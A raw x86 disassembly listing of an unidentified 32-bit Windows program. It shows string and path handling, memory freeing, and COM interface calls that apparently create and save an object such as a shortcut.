  403ca9:	ff 75 d8             	push   -0x28(%ebp)
  403cac:	e8 b9 55 01 00       	call   0x41926a
  403cb1:	ff 75 b4             	push   -0x4c(%ebp)
  403cb4:	e8 b1 55 01 00       	call   0x41926a
  403cb9:	ff 75 cc             	push   -0x34(%ebp)
  403cbc:	e8 a9 55 01 00       	call   0x41926a
  403cc1:	ff 75 9c             	push   -0x64(%ebp)
  403cc4:	e9 b8 01 00 00       	jmp    0x403e81
  403cc9:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  403ccc:	51                   	push   %ecx
  403ccd:	50                   	push   %eax
  403cce:	e8 60 f6 ff ff       	call   0x403333
  403cd3:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  403cd6:	51                   	push   %ecx
  403cd7:	50                   	push   %eax
  403cd8:	e8 56 f6 ff ff       	call   0x403333
  403cdd:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403ce0:	51                   	push   %ecx
  403ce1:	50                   	push   %eax
  403ce2:	e8 4c f6 ff ff       	call   0x403333
  403ce7:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  403cea:	51                   	push   %ecx
  403ceb:	50                   	push   %eax
  403cec:	e8 42 f6 ff ff       	call   0x403333
  403cf1:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  403cf4:	51                   	push   %ecx
  403cf5:	50                   	push   %eax
  403cf6:	e8 38 f6 ff ff       	call   0x403333
  403cfb:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  403cfe:	51                   	push   %ecx
  403cff:	50                   	push   %eax
  403d00:	e8 2e f6 ff ff       	call   0x403333
  403d05:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  403d08:	51                   	push   %ecx
  403d09:	50                   	push   %eax
  403d0a:	e8 24 f6 ff ff       	call   0x403333
  403d0f:	ff 75 90             	push   -0x70(%ebp)
  403d12:	ff d3                	call   *%ebx
  403d14:	8b 75 9c             	mov    -0x64(%ebp),%esi
  403d17:	83 c4 3c             	add    $0x3c,%esp
  403d1a:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  403d1d:	8b d8                	mov    %eax,%ebx
  403d1f:	75 2f                	jne    0x403d50
  403d21:	8d 45 9c             	lea    -0x64(%ebp),%eax
  403d24:	50                   	push   %eax
  403d25:	e8 93 f6 ff ff       	call   0x4033bd
  403d2a:	59                   	pop    %ecx
  403d2b:	8d 44 46 02          	lea    0x2(%esi,%eax,2),%eax
  403d2f:	50                   	push   %eax
  403d30:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  403d33:	e8 cb d6 ff ff       	call   0x401403
  403d38:	6a 2e                	push   $0x2e
  403d3a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  403d3d:	e8 ac ed ff ff       	call   0x402aee
  403d42:	3b c7                	cmp    %edi,%eax
  403d44:	7c 0a                	jl     0x403d50
  403d46:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403d49:	66 89 3c 41          	mov    %di,(%ecx,%eax,2)
  403d4d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403d50:	6a 5c                	push   $0x5c
  403d52:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403d55:	e8 3b da ff ff       	call   0x401795
  403d5a:	39 7d b8             	cmp    %edi,-0x48(%ebp)
  403d5d:	74 16                	je     0x403d75
  403d5f:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  403d62:	50                   	push   %eax
  403d63:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403d66:	e8 51 d7 ff ff       	call   0x4014bc
  403d6b:	6a 5c                	push   $0x5c
  403d6d:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403d70:	e8 20 da ff ff       	call   0x401795
  403d75:	ff 75 e4             	push   -0x1c(%ebp)
  403d78:	e8 6a fc ff ff       	call   0x4039e7
  403d7d:	85 c0                	test   %eax,%eax
  403d7f:	59                   	pop    %ecx
  403d80:	0f 84 c2 00 00 00    	je     0x403e48
  403d86:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403d89:	50                   	push   %eax
  403d8a:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403d8d:	e8 2a d7 ff ff       	call   0x4014bc
  403d92:	68 80 a7 41 00       	push   $0x41a780
  403d97:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403d9a:	e8 19 ed ff ff       	call   0x402ab8
  403d9f:	8d 45 08             	lea    0x8(%ebp),%eax
  403da2:	50                   	push   %eax
  403da3:	68 14 c4 41 00       	push   $0x41c414
  403da8:	6a 01                	push   $0x1
  403daa:	57                   	push   %edi
  403dab:	68 54 c4 41 00       	push   $0x41c454
  403db0:	89 7d 08             	mov    %edi,0x8(%ebp)
  403db3:	ff 15 60 a3 41 00    	call   *0x41a360
  403db9:	85 c0                	test   %eax,%eax
  403dbb:	0f 8c 87 00 00 00    	jl     0x403e48
  403dc1:	8b 45 08             	mov    0x8(%ebp),%eax
  403dc4:	56                   	push   %esi
  403dc5:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403dc8:	8b 08                	mov    (%eax),%ecx
  403dca:	50                   	push   %eax
  403dcb:	ff 51 50             	call   *0x50(%ecx)
  403dce:	39 7d dc             	cmp    %edi,-0x24(%ebp)
  403dd1:	74 0c                	je     0x403ddf
  403dd3:	8b 45 08             	mov    0x8(%ebp),%eax
  403dd6:	ff 75 d8             	push   -0x28(%ebp)
  403dd9:	8b 08                	mov    (%eax),%ecx
  403ddb:	50                   	push   %eax
  403ddc:	ff 51 1c             	call   *0x1c(%ecx)
  403ddf:	39 7d d0             	cmp    %edi,-0x30(%ebp)
  403de2:	74 0c                	je     0x403df0
  403de4:	8b 45 08             	mov    0x8(%ebp),%eax
  403de7:	ff 75 cc             	push   -0x34(%ebp)
  403dea:	8b 08                	mov    (%eax),%ecx
  403dec:	50                   	push   %eax
  403ded:	ff 51 2c             	call   *0x2c(%ecx)
  403df0:	39 7d c4             	cmp    %edi,-0x3c(%ebp)
  403df3:	74 0c                	je     0x403e01
  403df5:	8b 45 08             	mov    0x8(%ebp),%eax
  403df8:	ff 75 c0             	push   -0x40(%ebp)
  403dfb:	8b 08                	mov    (%eax),%ecx
  403dfd:	50                   	push   %eax
  403dfe:	ff 51 24             	call   *0x24(%ecx)
  403e01:	39 7d ac             	cmp    %edi,-0x54(%ebp)
  403e04:	74 0d                	je     0x403e13
  403e06:	8b 45 08             	mov    0x8(%ebp),%eax
  403e09:	8b 08                	mov    (%eax),%ecx
  403e0b:	53                   	push   %ebx
  403e0c:	ff 75 a8             	push   -0x58(%ebp)
  403e0f:	50                   	push   %eax
  403e10:	ff 51 44             	call   *0x44(%ecx)
  403e13:	8b 45 08             	mov    0x8(%ebp),%eax
  403e16:	8b 08                	mov    (%eax),%ecx
  403e18:	8d 55 fc             	lea    -0x4(%ebp),%edx
  403e1b:	52                   	push   %edx
  403e1c:	68 44 c4 41 00       	push   $0x41c444
  403e21:	50                   	push   %eax
  403e22:	ff 11                	call   *(%ecx)
  403e24:	85 c0                	test   %eax,%eax
  403e26:	7c 17                	jl     0x403e3f
  403e28:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403e2b:	8b 08                	mov    (%eax),%ecx
  403e2d:	6a 01                	push   $0x1
  403e2f:	ff 75 e4             	push   -0x1c(%ebp)
  403e32:	50                   	push   %eax
  403e33:	ff 51 18             	call   *0x18(%ecx)
  403e36:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403e39:	8b 08                	mov    (%eax),%ecx
  403e3b:	50                   	push   %eax
  403e3c:	ff 51 08             	call   *0x8(%ecx)
  403e3f:	8b 45 08             	mov    0x8(%ebp),%eax
  403e42:	8b 08                	mov    (%eax),%ecx
  403e44:	50                   	push   %eax
  403e45:	ff 51 08             	call   *0x8(%ecx)
  403e48:	ff 75 90             	push   -0x70(%ebp)
  403e4b:	e8 1a 54 01 00       	call   0x41926a
  403e50:	ff 75 a8             	push   -0x58(%ebp)
  403e53:	e8 12 54 01 00       	call   0x41926a
  403e58:	ff 75 c0             	push   -0x40(%ebp)
  403e5b:	e8 0a 54 01 00       	call   0x41926a
  403e60:	ff 75 f0             	push   -0x10(%ebp)
  403e63:	e8 02 54 01 00       	call   0x41926a
  403e68:	ff 75 d8             	push   -0x28(%ebp)
  403e6b:	e8 fa 53 01 00       	call   0x41926a
  403e70:	ff 75 b4             	push   -0x4c(%ebp)
  403e73:	e8 f2 53 01 00       	call   0x41926a
  403e78:	ff 75 cc             	push   -0x34(%ebp)
  403e7b:	e8 ea 53 01 00       	call   0x41926a
  403e80:	56                   	push   %esi
  403e81:	e8 e4 53 01 00       	call   0x41926a
  403e86:	ff 75 e4             	push   -0x1c(%ebp)
  403e89:	e8 dc 53 01 00       	call   0x41926a
  403e8e:	83 c4 24             	add    $0x24,%esp
  403e91:	5f                   	pop    %edi
  403e92:	5e                   	pop    %esi
  403e93:	33 c0                	xor    %eax,%eax
  403e95:	5b                   	pop    %ebx
  403e96:	c9                   	leave
  403e97:	c3                   	ret
  403e98:	55                   	push   %ebp
  403e99:	8b ec                	mov    %esp,%ebp
  403e9b:	83 ec 70             	sub    $0x70,%esp
  403e9e:	53                   	push   %ebx
  403e9f:	56                   	push   %esi
  403ea0:	8b 75 10             	mov    0x10(%ebp),%esi
  403ea3:	57                   	push   %edi
  403ea4:	68 80 e3 41 00       	push   $0x41e380
  403ea9:	8b ce                	mov    %esi,%ecx
  403eab:	e8 ff ec ff ff       	call   0x402baf
  403eb0:	8b 7d 14             	mov    0x14(%ebp),%edi
  403eb3:	68 94 e3 41 00       	push   $0x41e394
  403eb8:	8b cf                	mov    %edi,%ecx
  403eba:	e8 f0 ec ff ff       	call   0x402baf
  403ebf:	8b 46 04             	mov    0x4(%esi),%eax
  403ec2:	48                   	dec    %eax
  403ec3:	50                   	push   %eax
  403ec4:	6a 00                	push   $0x0
  403ec6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403ec9:	50                   	push   %eax
  403eca:	8b ce                	mov    %esi,%ecx
  403ecc:	e8 32 ee ff ff       	call   0x402d03
  403ed1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403ed4:	50                   	push   %eax
  403ed5:	8b ce                	mov    %esi,%ecx
  403ed7:	e8 0d ed ff ff       	call   0x402be9
  403edc:	ff 75 f4             	push   -0xc(%ebp)
  403edf:	e8 86 53 01 00       	call   0x41926a
  403ee4:	8b 47 04             	mov    0x4(%edi),%eax
  403ee7:	59                   	pop    %ecx
  403ee8:	48                   	dec    %eax
  403ee9:	50                   	push   %eax
  403eea:	6a 00                	push   $0x0
  403eec:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403eef:	50                   	push   %eax
  403ef0:	8b cf                	mov    %edi,%ecx
  403ef2:	e8 0c ee ff ff       	call   0x402d03
  403ef7:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403efa:	50                   	push   %eax
  403efb:	8b cf                	mov    %edi,%ecx
  403efd:	e8 e7 ec ff ff       	call   0x402be9
  403f02:	ff 75 f4             	push   -0xc(%ebp)
  403f05:	e8 60 53 01 00       	call   0x41926a
  403f0a:	8b 45 0c             	mov    0xc(%ebp),%eax
  403f0d:	85 c0                	test   %eax,%eax
  403f0f:	8b 1d d0 a2 41 00    	mov    0x41a2d0,%ebx
  403f15:	59                   	pop    %ecx
  403f16:	74 2a                	je     0x403f42
  403f18:	80 38 00             	cmpb   $0x0,(%eax)
  403f1b:	74 25                	je     0x403f42
  403f1d:	50                   	push   %eax
  403f1e:	8d 45 90             	lea    -0x70(%ebp),%eax
  403f21:	68 a0 a7 41 00       	push   $0x41a7a0
  403f26:	50                   	push   %eax
  403f27:	ff d3                	call   *%ebx
  403f29:	83 c4 0c             	add    $0xc,%esp
  403f2c:	8d 45 90             	lea    -0x70(%ebp),%eax
  403f2f:	50                   	push   %eax
  403f30:	8b ce                	mov    %esi,%ecx
  403f32:	e8 12 ed ff ff       	call   0x402c49
  403f37:	8d 45 90             	lea    -0x70(%ebp),%eax
  403f3a:	50                   	push   %eax
  403f3b:	8b cf                	mov    %edi,%ecx
  403f3d:	e8 07 ed ff ff       	call   0x402c49
  403f42:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403f46:	74 27                	je     0x403f6f
  403f48:	ff 75 08             	push   0x8(%ebp)
  403f4b:	8d 45 90             	lea    -0x70(%ebp),%eax
  403f4e:	68 90 a7 41 00       	push   $0x41a790
  403f53:	50                   	push   %eax
  403f54:	ff d3                	call   *%ebx
  403f56:	83 c4 0c             	add    $0xc,%esp
  403f59:	8d 45 90             	lea    -0x70(%ebp),%eax
  403f5c:	50                   	push   %eax
  403f5d:	8b ce                	mov    %esi,%ecx
  403f5f:	e8 e5 ec ff ff       	call   0x402c49
  403f64:	8d 45 90             	lea    -0x70(%ebp),%eax
  403f67:	50                   	push   %eax
  403f68:	8b cf                	mov    %edi,%ecx
  403f6a:	e8 da ec ff ff       	call   0x402c49
  403f6f:	bb 8c a7 41 00       	mov    $0x41a78c,%ebx
  403f74:	53                   	push   %ebx
  403f75:	8b ce                	mov    %esi,%ecx
  403f77:	e8 cd ec ff ff       	call   0x402c49
  403f7c:	53                   	push   %ebx
  403f7d:	8b cf                	mov    %edi,%ecx
  403f7f:	e8 c5 ec ff ff       	call   0x402c49
  403f84:	5f                   	pop    %edi
  403f85:	5e                   	pop    %esi
  403f86:	5b                   	pop    %ebx
  403f87:	c9                   	leave
  403f88:	c3                   	ret
  403f89:	55                   	push   %ebp
  403f8a:	8b ec                	mov    %esp,%ebp
  403f8c:	83 ec 34             	sub    $0x34,%esp
  403f8f:	53                   	push   %ebx
  403f90:	56                   	push   %esi
  403f91:	57                   	push   %edi
  403f92:	e8 ce e6 ff ff       	call   0x402665
  403f97:	33 db                	xor    %ebx,%ebx
  403f99:	3b c3                	cmp    %ebx,%eax
  403f9b:	74 1a                	je     0x403fb7
  403f9d:	83 f8 09             	cmp    $0x9,%eax
  403fa0:	74 05                	je     0x403fa7
  403fa2:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  403fa5:	eb 21                	jmp    0x403fc8
  403fa7:	c7 45 f0 c0 a7 41 00 	movl   $0x41a7c0,-0x10(%ebp)
  403fae:	c7 45 f4 b8 a7 41 00 	movl   $0x41a7b8,-0xc(%ebp)
  403fb5:	eb 0e                	jmp    0x403fc5
  403fb7:	c7 45 f0 b4 a7 41 00 	movl   $0x41a7b4,-0x10(%ebp)
  403fbe:	c7 45 f4 ac a7 41 00 	movl   $0x41a7ac,-0xc(%ebp)
  403fc5:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  403fc8:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  403fcb:	e8 49 eb ff ff       	call   0x402b19
  403fd0:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403fd3:	e8 41 eb ff ff       	call   0x402b19
  403fd8:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403fdb:	e8 39 eb ff ff       	call   0x402b19
  403fe0:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403fe3:	50                   	push   %eax
  403fe4:	8d 45 cc             	lea    -0x34(%ebp),%eax
  403fe7:	50                   	push   %eax
  403fe8:	53                   	push   %ebx
  403fe9:	53                   	push   %ebx
  403fea:	88 5d ff             	mov    %bl,-0x1(%ebp)
  403fed:	e8 a6 fe ff ff       	call   0x403e98
  403ff2:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  403ff5:	50                   	push   %eax
  403ff6:	ff 75 d8             	push   -0x28(%ebp)
  403ff9:	ff 75 cc             	push   -0x34(%ebp)
  403ffc:	ff 75 08             	push   0x8(%ebp)
  403fff:	e8 e0 ee ff ff       	call   0x402ee4
  404004:	83 c4 20             	add    $0x20,%esp
  404007:	84 c0                	test   %al,%al
  404009:	74 04                	je     0x40400f
  40400b:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  40400f:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404012:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404015:	50                   	push   %eax
  404016:	8b cf                	mov    %edi,%ecx
  404018:	e8 cc eb ff ff       	call   0x402be9
  40401d:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404020:	8d 75 f0             	lea    -0x10(%ebp),%esi
  404023:	eb 4d                	jmp    0x404072
  404025:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404028:	51                   	push   %ecx
  404029:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40402c:	51                   	push   %ecx
  40402d:	50                   	push   %eax
  40402e:	53                   	push   %ebx
  40402f:	e8 64 fe ff ff       	call   0x403e98
  404034:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404037:	50                   	push   %eax
  404038:	ff 75 d8             	push   -0x28(%ebp)
  40403b:	ff 75 cc             	push   -0x34(%ebp)
  40403e:	ff 75 08             	push   0x8(%ebp)
  404041:	e8 9e ee ff ff       	call   0x402ee4
  404046:	83 c4 20             	add    $0x20,%esp
  404049:	84 c0                	test   %al,%al
  40404b:	74 20                	je     0x40406d
  40404d:	39 5f 04             	cmp    %ebx,0x4(%edi)
  404050:	74 0c                	je     0x40405e
  404052:	68 a8 a7 41 00       	push   $0x41a7a8
  404057:	8b cf                	mov    %edi,%ecx
  404059:	e8 eb eb ff ff       	call   0x402c49
  40405e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404061:	50                   	push   %eax
  404062:	8b cf                	mov    %edi,%ecx
  404064:	e8 16 ec ff ff       	call   0x402c7f
  404069:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  40406d:	83 c6 04             	add    $0x4,%esi
  404070:	8b 06                	mov    (%esi),%eax
  404072:	3b c3                	cmp    %ebx,%eax
  404074:	75 af                	jne    0x404025
  404076:	8d 45 d8             	lea    -0x28(%ebp),%eax
  404079:	50                   	push   %eax
  40407a:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40407d:	50                   	push   %eax
  40407e:	0f b7 05 80 e9 41 00 	movzwl 0x41e980,%eax
  404085:	53                   	push   %ebx
  404086:	50                   	push   %eax
  404087:	e8 0c fe ff ff       	call   0x403e98
  40408c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40408f:	50                   	push   %eax
  404090:	ff 75 d8             	push   -0x28(%ebp)
  404093:	ff 75 cc             	push   -0x34(%ebp)
  404096:	ff 75 08             	push   0x8(%ebp)
  404099:	e8 46 ee ff ff       	call   0x402ee4
  40409e:	83 c4 20             	add    $0x20,%esp
  4040a1:	84 c0                	test   %al,%al
  4040a3:	74 04                	je     0x4040a9
  4040a5:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  4040a9:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4040ac:	50                   	push   %eax
  4040ad:	8b cf                	mov    %edi,%ecx
  4040af:	e8 cb eb ff ff       	call   0x402c7f
  4040b4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4040b7:	8d 75 f0             	lea    -0x10(%ebp),%esi
  4040ba:	eb 54                	jmp    0x404110
  4040bc:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4040bf:	51                   	push   %ecx
  4040c0:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4040c3:	51                   	push   %ecx
  4040c4:	50                   	push   %eax
  4040c5:	0f b7 05 80 e9 41 00 	movzwl 0x41e980,%eax
  4040cc:	50                   	push   %eax
  4040cd:	e8 c6 fd ff ff       	call   0x403e98
  4040d2:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4040d5:	50                   	push   %eax
  4040d6:	ff 75 d8             	push   -0x28(%ebp)
  4040d9:	ff 75 cc             	push   -0x34(%ebp)
  4040dc:	ff 75 08             	push   0x8(%ebp)
  4040df:	e8 00 ee ff ff       	call   0x402ee4
  4040e4:	83 c4 20             	add    $0x20,%esp
  4040e7:	84 c0                	test   %al,%al
  4040e9:	74 20                	je     0x40410b
  4040eb:	39 5f 04             	cmp    %ebx,0x4(%edi)
  4040ee:	74 0c                	je     0x4040fc
  4040f0:	68 a8 a7 41 00       	push   $0x41a7a8
  4040f5:	8b cf                	mov    %edi,%ecx
  4040f7:	e8 4d eb ff ff       	call   0x402c49
  4040fc:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4040ff:	50                   	push   %eax
  404100:	8b cf                	mov    %edi,%ecx
  404102:	e8 78 eb ff ff       	call   0x402c7f
  404107:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  40410b:	83 c6 04             	add    $0x4,%esi
  40410e:	8b 06                	mov    (%esi),%eax
  404110:	3b c3                	cmp    %ebx,%eax
  404112:	75 a8                	jne    0x4040bc
  404114:	ff 75 e4             	push   -0x1c(%ebp)
  404117:	e8 4e 51 01 00       	call   0x41926a
  40411c:	ff 75 d8             	push   -0x28(%ebp)
  40411f:	e8 46 51 01 00       	call   0x41926a
  404124:	ff 75 cc             	push   -0x34(%ebp)
  404127:	e8 3e 51 01 00       	call   0x41926a
  40412c:	8a 45 ff             	mov    -0x1(%ebp),%al
  40412f:	83 c4 0c             	add    $0xc,%esp
  404132:	5f                   	pop    %edi
  404133:	5e                   	pop    %esi
  404134:	5b                   	pop    %ebx
  404135:	c9                   	leave
  404136:	c3                   	ret
  404137:	55                   	push   %ebp
  404138:	8b ec                	mov    %esp,%ebp
  40413a:	51                   	push   %ecx
  40413b:	51                   	push   %ecx
  40413c:	53                   	push   %ebx
  40413d:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404140:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  404144:	56                   	push   %esi
  404145:	8b f1                	mov    %ecx,%esi
  404147:	75 04                	jne    0x40414d
  404149:	33 c0                	xor    %eax,%eax
  40414b:	eb 5f                	jmp    0x4041ac
  40414d:	57                   	push   %edi
  40414e:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404151:	57                   	push   %edi
  404152:	53                   	push   %ebx
  404153:	e8 5d ec ff ff       	call   0x402db5
  404158:	84 c0                	test   %al,%al
  40415a:	59                   	pop    %ecx
  40415b:	59                   	pop    %ecx
  40415c:	74 04                	je     0x404162
  40415e:	33 c0                	xor    %eax,%eax
  404160:	eb 49                	jmp    0x4041ab
  404162:	8b 43 04             	mov    0x4(%ebx),%eax
  404165:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404168:	8b 47 04             	mov    0x4(%edi),%eax
  40416b:	33 ff                	xor    %edi,%edi
  40416d:	39 7e 04             	cmp    %edi,0x4(%esi)
  404170:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404173:	89 7d 08             	mov    %edi,0x8(%ebp)
  404176:	7e 30                	jle    0x4041a8
  404178:	57                   	push   %edi
  404179:	53                   	push   %ebx
  40417a:	8b ce                	mov    %esi,%ecx
  40417c:	e8 23 e6 ff ff       	call   0x4027a4
  404181:	8b f8                	mov    %eax,%edi
  404183:	85 ff                	test   %edi,%edi
  404185:	7c 21                	jl     0x4041a8
  404187:	ff 75 fc             	push   -0x4(%ebp)
  40418a:	8b ce                	mov    %esi,%ecx
  40418c:	57                   	push   %edi
  40418d:	e8 3c eb ff ff       	call   0x402cce
  404192:	ff 75 0c             	push   0xc(%ebp)
  404195:	8b ce                	mov    %esi,%ecx
  404197:	57                   	push   %edi
  404198:	e8 5c f4 ff ff       	call   0x4035f9
  40419d:	03 7d f8             	add    -0x8(%ebp),%edi
  4041a0:	ff 45 08             	incl   0x8(%ebp)
  4041a3:	3b 7e 04             	cmp    0x4(%esi),%edi
  4041a6:	7c d0                	jl     0x404178
  4041a8:	8b 45 08             	mov    0x8(%ebp),%eax
  4041ab:	5f                   	pop    %edi
  4041ac:	5e                   	pop    %esi
  4041ad:	5b                   	pop    %ebx
  4041ae:	c9                   	leave
  4041af:	c2 08 00             	ret    $0x8
  4041b2:	55                   	push   %ebp
  4041b3:	8b ec                	mov    %esp,%ebp
  4041b5:	83 ec 18             	sub    $0x18,%esp
  4041b8:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4041bb:	e8 2b d3 ff ff       	call   0x4014eb
  4041c0:	ff 75 0c             	push   0xc(%ebp)
  4041c3:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4041c6:	e8 71 d2 ff ff       	call   0x40143c
  4041cb:	68 e8 a7 41 00       	push   $0x41a7e8
  4041d0:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4041d3:	e8 e0 e8 ff ff       	call   0x402ab8
  4041d8:	68 dc a7 41 00       	push   $0x41a7dc
  4041dd:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4041e0:	e8 82 e8 ff ff       	call   0x402a67
  4041e5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4041e8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4041eb:	50                   	push   %eax
  4041ec:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4041ef:	50                   	push   %eax
  4041f0:	e8 42 ff ff ff       	call   0x404137
  4041f5:	ff 75 e8             	push   -0x18(%ebp)
  4041f8:	e8 6d 50 01 00       	call   0x41926a
  4041fd:	59                   	pop    %ecx
  4041fe:	ff 75 0c             	push   0xc(%ebp)
  404201:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404204:	e8 33 d2 ff ff       	call   0x40143c
  404209:	68 d8 a7 41 00       	push   $0x41a7d8
  40420e:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404211:	e8 a2 e8 ff ff       	call   0x402ab8
  404216:	68 cc a7 41 00       	push   $0x41a7cc
  40421b:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40421e:	e8 44 e8 ff ff       	call   0x402a67
  404223:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404226:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404229:	50                   	push   %eax
  40422a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40422d:	50                   	push   %eax
  40422e:	e8 04 ff ff ff       	call   0x404137
  404233:	ff 75 e8             	push   -0x18(%ebp)
  404236:	e8 2f 50 01 00       	call   0x41926a
  40423b:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40423e:	c7 04 24 c4 a7 41 00 	movl   $0x41a7c4,(%esp)
  404245:	e8 1d e8 ff ff       	call   0x402a67
  40424a:	ff 75 0c             	push   0xc(%ebp)
  40424d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404250:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404253:	50                   	push   %eax
  404254:	e8 de fe ff ff       	call   0x404137
  404259:	ff 75 e8             	push   -0x18(%ebp)
  40425c:	e8 09 50 01 00       	call   0x41926a
  404261:	ff 75 f4             	push   -0xc(%ebp)
  404264:	e8 01 50 01 00       	call   0x41926a
  404269:	59                   	pop    %ecx
  40426a:	59                   	pop    %ecx
  40426b:	c9                   	leave
  40426c:	c3                   	ret
  40426d:	55                   	push   %ebp
  40426e:	8b ec                	mov    %esp,%ebp
  404270:	83 ec 18             	sub    $0x18,%esp
  404273:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404276:	e8 70 d2 ff ff       	call   0x4014eb
  40427b:	ff 75 0c             	push   0xc(%ebp)
  40427e:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404281:	e8 b6 d1 ff ff       	call   0x40143c
  404286:	68 e8 a7 41 00       	push   $0x41a7e8
  40428b:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40428e:	e8 25 e8 ff ff       	call   0x402ab8
  404293:	68 00 a8 41 00       	push   $0x41a800
  404298:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40429b:	e8 c7 e7 ff ff       	call   0x402a67
  4042a0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4042a3:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4042a6:	50                   	push   %eax
  4042a7:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4042aa:	50                   	push   %eax
  4042ab:	e8 87 fe ff ff       	call   0x404137
  4042b0:	ff 75 e8             	push   -0x18(%ebp)
  4042b3:	e8 b2 4f 01 00       	call   0x41926a
  4042b8:	59                   	pop    %ecx
  4042b9:	ff 75 0c             	push   0xc(%ebp)
  4042bc:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4042bf:	e8 78 d1 ff ff       	call   0x40143c
  4042c4:	68 d8 a7 41 00       	push   $0x41a7d8
  4042c9:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4042cc:	e8 e7 e7 ff ff       	call   0x402ab8
  4042d1:	68 f4 a7 41 00       	push   $0x41a7f4
  4042d6:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4042d9:	e8 89 e7 ff ff       	call   0x402a67
  4042de:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4042e1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4042e4:	50                   	push   %eax
  4042e5:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4042e8:	50                   	push   %eax
  4042e9:	e8 49 fe ff ff       	call   0x404137
  4042ee:	ff 75 e8             	push   -0x18(%ebp)
  4042f1:	e8 74 4f 01 00       	call   0x41926a
  4042f6:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4042f9:	c7 04 24 ec a7 41 00 	movl   $0x41a7ec,(%esp)
  404300:	e8 62 e7 ff ff       	call   0x402a67
  404305:	ff 75 0c             	push   0xc(%ebp)
  404308:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40430b:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40430e:	50                   	push   %eax
  40430f:	e8 23 fe ff ff       	call   0x404137
  404314:	ff 75 e8             	push   -0x18(%ebp)
  404317:	e8 4e 4f 01 00       	call   0x41926a
  40431c:	ff 75 f4             	push   -0xc(%ebp)
  40431f:	e8 46 4f 01 00       	call   0x41926a
  404324:	59                   	pop    %ecx
  404325:	59                   	pop    %ecx
  404326:	c9                   	leave
  404327:	c3                   	ret
